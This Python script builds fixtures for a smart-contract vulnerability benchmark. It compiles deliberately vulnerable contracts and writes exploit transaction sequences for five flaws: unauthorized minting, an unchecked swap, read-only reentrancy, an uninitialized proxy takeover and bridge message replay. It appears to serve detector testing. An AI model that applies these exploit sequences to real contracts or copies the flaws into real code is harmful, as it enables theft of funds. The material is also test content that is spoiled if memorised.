#!/usr/bin/env python3
"""Build executable_evm fixtures for the known_vulnerable benchmark pack.

Reads SAFE fixtures from ../negative_controls/fixtures/ where a base exists
(erc20-bad-mint-inflation, flashloan-price-manipulation), replaces the target
account's runtime bytecode with deliberately vulnerable compiled code, and
authours an exploit transaction sequence per case. Calldata is encoded in pure
Python (keccak via pycryptodome) because `cast` is not available; the encoder
is unit-checked against the reference calldata already committed in the gate2
fixtures.

Never add these contracts to the negative pack.
"""
import copy
import json
import subprocess
import sys
from pathlib import Path

from Crypto.Hash import keccak as _keccak

ROOT = Path(__file__).resolve().parents[3]
PACK = ROOT / 'benchmarks/historical/known_vulnerable'
NEGATIVE = ROOT / 'benchmarks/historical/negative_controls'
GATE2 = ROOT / 'benchmarks/historical/gate2_positive_controls'
SOURCE = PACK / 'contracts/VulnerableKnownFixtures.sol'

A = '0x' + 'aa' * 20          # attacker EOA (matches expected_attacker in TOMLs)
V = '0x' + 'bb' * 20          # victim EOA
M = '0x' + '11' * 20          # third funded EOA (owner/minter role where used)
AC = '0x3300000000000000000000000000000000000003'   # attacker callback contract
E = 10 ** 18
FUNDING = '0xd3c21bcecceda1000000'  # 10^24 wei, same as the control packs


def run(*args):
    return subprocess.check_output(args, cwd=ROOT, text=True).strip()


def keccak32(data: bytes) -> bytes:
    return _keccak.new(data=data, digest_bits=256).digest()


def keccak_hex(data: bytes) -> str:
    return '0x' + keccak32(data).hex()


def selector(signature: str) -> str:
    """4-byte selector as plain hex (no 0x prefix)."""
    return keccak32(signature.encode()).hex()[:8]


def pad(word: int) -> str:
    return format(word, '064x')


def address_word(address: str) -> int:
    return int(address, 16)


def encode_call(signature: str, *args) -> str:
    """ABI-encode a top-level call: 4-byte selector plus head-encoded args.

    Supports the static types the fixtures need (uint256, address, bytes32)
    plus tail-encoded empty `bytes`, encoded the way `cast calldata` does.
    """
    types = [t for t in signature[signature.index('(') + 1:-1].split(',') if t]
    assert len(types) == len(args), (signature, args)

    def encode_arg(arg_type, value):
        if arg_type == 'bytes':
            data = bytes.fromhex(value[2:] if value.startswith('0x') else value)
            padded = (data + b'\x00' * ((-len(data)) % 32)).hex()
            return [format(len(data), '064x')] + [padded[i:i + 64] for i in range(0, len(padded), 64)]
        if arg_type == 'address':
            return [pad(address_word(value))]
        if arg_type == 'bytes32':
            text = value[2:] if value.startswith('0x') else value
            assert len(text) == 64, value
            return [text]
        return [format(int(value), '064x')]

    head, dynamic = [], []
    offset = 32 * len(types)
    for arg_type, value in zip(types, args):
        if arg_type == 'bytes':
            head.append(format(offset, '064x'))
            offset += 32 + ((len(value) - 2 if value.startswith('0x') else len(value)) + 31) // 32 * 32
            dynamic.extend(encode_arg(arg_type, value))
        else:
            head.extend(encode_arg(arg_type, value))
    return '0x' + selector(signature) + ''.join(head + dynamic)


def check_encoder_against_references():
    """The encoder must reproduce calldata committed in the gate2 fixtures."""
    gate2_erc20 = json.loads((GATE2 / 'fixtures/erc20-owner-mint.json').read_text())
    expected_mint = gate2_erc20['transactions'][1]['calldata']
    actual_mint = encode_call('mint(address,uint256)', A, 100 * E)
    assert actual_mint == expected_mint, (actual_mint, expected_mint)
    expected_can_mint = gate2_erc20['transactions'][0]['calldata']
    actual_can_mint = encode_call('canMint(address)', A)
    assert actual_can_mint == expected_can_mint, (actual_can_mint, expected_can_mint)
    negative_erc20 = json.loads(
        (NEGATIVE / 'fixtures/erc20-owner-mint.json').read_text())
    expected_balance = negative_erc20['transactions'][5]['calldata']
    actual_balance = encode_call('balanceOf(address)', A)
    assert actual_balance == expected_balance, (actual_balance, expected_balance)
    negative_amm = json.loads(
        (NEGATIVE / 'fixtures/amm-balanced-swap.json').read_text())
    expected_swap = negative_amm['transactions'][1]['calldata']
    actual_swap = encode_call('swap(uint256,uint256,address,bytes)', 0, 999, A, '0x')
    assert actual_swap == expected_swap, (actual_swap, expected_swap)
    print('calldata encoder matches gate2/negative reference calldata')


def mapping_slot(key_type: str, key: str, base: int) -> str:
    """Solidity mapping slot: keccak256(key_word || base_slot)."""
    if key_type == 'address':
        key_word = pad(address_word(key))
    elif key_type == 'bytes32':
        key_word = key[2:] if key.startswith('0x') else key
        assert len(key_word) == 64, key
    else:
        raise ValueError(key_type)
    return keccak_hex(bytes.fromhex(key_word + pad(base)))


def nested_mapping_slot(outer_key: str, inner_key: str, base: int) -> str:
    """allowance[owner][spender]: keccak256(spender || keccak256(owner || base))."""
    inner = keccak32(bytes.fromhex(pad(address_word(outer_key)) + pad(base)))
    return keccak_hex(bytes.fromhex(pad(address_word(inner_key)) + inner.hex()))


def word(value: int) -> str:
    return '0x' + format(value, '064x')


def reserves_output(r0: int, r1: int, block: int = 0) -> str:
    return '0x' + format(r0, '064x') + format(r1, '064x') + format(block, '064x')


def funded_eoa(address: str) -> dict:
    return dict(address=address, balance=FUNDING, nonce=0, runtime_bytecode='0x', storage=[])


def hexword(value: str) -> str:
    """Normalize a 32-byte word to the 0x-prefixed hex form fixtures use."""
    return value if value.startswith('0x') else '0x' + value


def contract_account(address: str, bytecode: str, storage: dict) -> dict:
    return dict(
        address=address, balance='0x0', nonce=0, runtime_bytecode=bytecode,
        storage=[dict(slot=hexword(slot), value=hexword(value))
                 for slot, value in storage.items()],
    )


def tx(caller: str, to: str, calldata: str, *, output=None, slots=None, status='Success'):
    return dict(
        caller=caller, to=to, calldata=calldata, value='0x0', timestamp=1000,
        expected_status=status, expected_output=hexword(output) if output else None,
        expected_storage=[dict(slot=hexword(slot), value=hexword(value))
                          for slot, value in (slots or {}).items()],
    )


assert '0.8.30+' in run('solc', '--version'), 'solc 0.8.30 required'
check_encoder_against_references()
compiled = json.loads(run('solc', '--optimize', '--evm-version', 'shanghai',
                          '--combined-json', 'bin-runtime',
                          str(SOURCE.relative_to(ROOT))))['contracts']
code = {key.rsplit(':', 1)[1]: '0x' + value['bin-runtime'] for key, value in compiled.items()}

# EIP-1967 implementation slot.
EIP1967 = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
MESSAGE_HASH = keccak_hex(b'known-bridge-nonce-replay:message-1')


def retarget(base: dict, old_target: str, new_target: str, bytecode: str) -> dict:
    """Copy a safe fixture and swap the target account for vulnerable code."""
    f = copy.deepcopy(base)
    f['target'] = new_target
    for account in f['accounts']:
        if account['address'] == old_target:
            account['address'] = new_target
            account['runtime_bytecode'] = bytecode
    for t in f['transactions']:
        if t['to'] == old_target:
            t['to'] = new_target
    return f


def write(name: str, fixture: dict, safe_behavior: str) -> None:
    fixture['expected_safe_behavior'] = 'DELIBERATELY VULNERABLE WITNESS: ' + safe_behavior
    path = PACK / 'fixtures' / f'{name}.json'
    path.write_text(json.dumps(fixture, indent=2) + '\n')
    print(name, 'transactions=', len(fixture['transactions']), '->', path.relative_to(ROOT))


# ---------------------------------------------------------------------------
# 1. known-erc20-bad-mint-inflation
# ---------------------------------------------------------------------------
def build_erc20():
    base = json.loads((NEGATIVE / 'fixtures/erc20-owner-mint.json').read_text())
    target = '0x6200000000000000000000000000000000000001'
    f = retarget(base, '0x6200000000000000000000000000000000000101', target, code['UnauthMintToken'])
    f['transactions'] = [
        tx(A, target, encode_call('canMint(address)', A), output=word(0)),
        # The unauthorized mint itself: succeeds on the vulnerable token.
        tx(A, target, encode_call('mint(address,uint256)', A, 100 * E),
           slots={'0x2': word(100 * E), mapping_slot('address', A, 0): word(100 * E)}),
        tx(A, target, encode_call('balanceOf(address)', A), output=word(100 * E)),
        tx(A, target, encode_call('totalSupply()'), output=word(100 * E)),
    ]
    write('known-erc20-bad-mint-inflation', f,
          'Attacker is not the minter, yet mint() grants it 100 tokens and inflates total supply.')


# ---------------------------------------------------------------------------
# 2. known-flashloan-price-manipulation
# ---------------------------------------------------------------------------
def build_amm():
    base = json.loads((NEGATIVE / 'fixtures/amm-balanced-swap.json').read_text())
    target = '0x6200000000000000000000000000000000000004'
    token0, token1 = '0x7000000000000000000000000000000000000001', '0x7000000000000000000000000000000000000002'
    f = retarget(base, '0x6200000000000000000000000000000000000301', target, code['NoProductCheckPool'])
    # The tokens' pre-seeded `balances[pool]` slots are keccak(pool . 0): the
    # pool address changed, so re-derive those slots with the same values.
    for account in f['accounts']:
        if account['address'] == token0:
            account['storage'] = [
                dict(slot=mapping_slot('address', target, 0), value=word(1000000)),
                dict(slot=mapping_slot('address', A, 0), value=word(10000)),
                dict(slot='0x2', value=word(1010000)),
            ]
        elif account['address'] == token1:
            account['storage'] = [
                dict(slot=mapping_slot('address', target, 0), value=word(1000000)),
                dict(slot='0x2', value=word(1000000)),
            ]
    f['transactions'] = [
        tx(A, target, encode_call('getReserves()'), output=reserves_output(1000000, 1000000)),
        # No flash-loan, no input transfer: the pool hands out 100000 token0
        # and the reserve-product check that would revert is gone.
        tx(A, target, encode_call('swap(uint256,uint256,address,bytes)', 100000, 0, A, '0x'),
           slots={'0x2': word(900000), '0x3': word(1000000)}),
        tx(A, target, encode_call('getReserves()'), output=reserves_output(900000, 1000000)),
        tx(A, token0, encode_call('balanceOf(address)', A), output=word(110000)),
    ]
    write('known-flashloan-price-manipulation', f,
          'Swap extracts 100000 token0 without paying; reserve product drops from 1e12 to 9e11.')


# ---------------------------------------------------------------------------
# 3. known-read-only-reentrancy
# ---------------------------------------------------------------------------
def build_read_only_reentrancy():
    target = '0x6200000000000000000000000000000000000003'
    token = '0x7000000000000000000000000000000000000003'
    token_storage = {
        mapping_slot('address', V, 0): word(300 * E),
        mapping_slot('address', AC, 0): word(100 * E),
        '0x2': word(400 * E),
    }
    fixture = {
        'schema_version': 1, 'bytecode_kind': 'runtime', 'target': target,
        'attacker': A, 'victim': V,
        'environment': dict(chain_id=1, block_number=1, timestamp=1000,
                            gas_limit=30000000, base_fee=0),
        'accounts': [
            funded_eoa(A), funded_eoa(V), funded_eoa(M),
            contract_account(AC, code['ReentrantAttacker'], {}),
            contract_account(target, code['ReentrantVault'], {}),
            contract_account(token, code['HookToken'], token_storage),
        ],
        'transactions': [
            # The victim funds the vault: 300 tokens on deposit (the vault's
            # owed-to-victim credit is written on-chain, not pre-seeded).
            tx(V, token, encode_call('approve(address,uint256)', target, 300 * E), output=word(1)),
            tx(V, target, encode_call('deposit(uint256)', 300 * E)),
            # The attacker EOA drives the callback contract: it approves the
            # vault and deposits 100 tokens as itself...
            tx(A, AC, encode_call('enterDeposit(uint256)', 100 * E)),
            # ...then withdraws: the transfer hook re-enters, reads the STALE
            # pre-decrement balance through the vault's view, and mints that
            # value as profit the vault's token holdings never back.
            tx(A, AC, encode_call('enterWithdraw(uint256)', 100 * E)),
            # Top-level observation of the drained pool for the return_value
            # binding: the vault holds 300 tokens against 400 owed.
            tx(A, token, encode_call('balanceOf(address)', target), output=word(300 * E),
               slots={mapping_slot('address', target, 0): word(300 * E)}),
        ],
        'expected_safe_behavior': 'placeholder',
    }
    write('known-read-only-reentrancy', fixture,
          'During withdraw the callback reads a stale pre-decrement balance and mints '
          'unbacked profit: the vault owes 400 tokens while holding 300.')


# ---------------------------------------------------------------------------
# 4. known-uninitialized-proxy-takeover
# ---------------------------------------------------------------------------
def build_proxy():
    target = '0x6200000000000000000000000000000000000002'
    fixture = {
        'schema_version': 1, 'bytecode_kind': 'runtime', 'target': target,
        'attacker': A, 'victim': V,
        'environment': dict(chain_id=1, block_number=1, timestamp=1000,
                            gas_limit=30000000, base_fee=0),
        'accounts': [
            funded_eoa(A), funded_eoa(V), funded_eoa(M),
            contract_account(target, code['UninitializedProxy'], {}),
        ],
        'transactions': [
            # Attacker claims ownership of the uninitialized proxy.
            tx(A, target, encode_call('initialize(address)', A),
               slots={'0x0': pad(address_word(A))}),
            # With ownership captured, the implementation slot is repointed.
            tx(A, target, encode_call('upgradeTo(address)', A),
               slots={EIP1967: pad(address_word(A))}),
            tx(A, target, encode_call('owner()'), output=pad(address_word(A))),
            tx(A, target, encode_call('implementation()'), output=pad(address_word(A))),
        ],
        'expected_safe_behavior': 'placeholder',
    }
    write('known-uninitialized-proxy-takeover', fixture,
          'The proxy ships with an unset EIP-1967 slot and an unguarded initializer: '
          'the attacker initializes itself to owner and repoints the implementation.')


# ---------------------------------------------------------------------------
# 5. known-bridge-nonce-replay
# ---------------------------------------------------------------------------
def build_bridge():
    target = '0x6200000000000000000000000000000000000005'
    token = '0x7000000000000000000000000000000000000005'
    released_slot = mapping_slot('bytes32', MESSAGE_HASH, 0)
    processed_slot = mapping_slot('bytes32', MESSAGE_HASH, 1)
    token_storage = {
        mapping_slot('address', target, 0): word(2 * E),
        '0x2': word(2 * E),
    }
    fixture = {
        'schema_version': 1, 'bytecode_kind': 'runtime', 'target': target,
        'attacker': A, 'victim': V,
        'environment': dict(chain_id=1, block_number=1, timestamp=1000,
                            gas_limit=30000000, base_fee=0),
        'accounts': [
            funded_eoa(A), funded_eoa(V), funded_eoa(M),
            contract_account(target, code['ReplayBridge'], {}),
            contract_account(token, code['HookToken'], token_storage),
        ],
        'transactions': [
            tx(A, target, encode_call('finalize(bytes32)', MESSAGE_HASH),
               slots={released_slot: word(E)}),
            # Replay of the same message hash: the processed flag was never
            # written, so the identical finalize pays out a second time.
            tx(A, target, encode_call('finalize(bytes32)', MESSAGE_HASH),
               slots={released_slot: word(2 * E)}),
            tx(A, target, encode_call('processed(bytes32)', MESSAGE_HASH), output=word(0),
               slots={processed_slot: word(0)}),
        ],
        'expected_safe_behavior': 'placeholder',
    }
    write('known-bridge-nonce-replay', fixture,
          'finalize() pays 1 token per message hash but never marks the hash processed, '
          'so the same message finalizes twice and releases 2 tokens.')


if __name__ == '__main__':
    build_erc20()
    build_amm()
    build_read_only_reentrancy()
    build_proxy()
    build_bridge()
    print('MESSAGE_HASH =', MESSAGE_HASH)
    print('selectors:',
          {s: selector(s) for s in (
              'mint(address,uint256)', 'canMint(address)',
              'swap(uint256,uint256,address,bytes)', 'getReserves()',
              'deposit(uint256)', 'withdraw(uint256)', 'balanceOf(address)',
              'initialize(address)', 'upgradeTo(address)', 'owner()',
              'finalize(bytes32)', 'claim(bytes32)', 'processed(bytes32)',
              'approve(address,uint256)')})
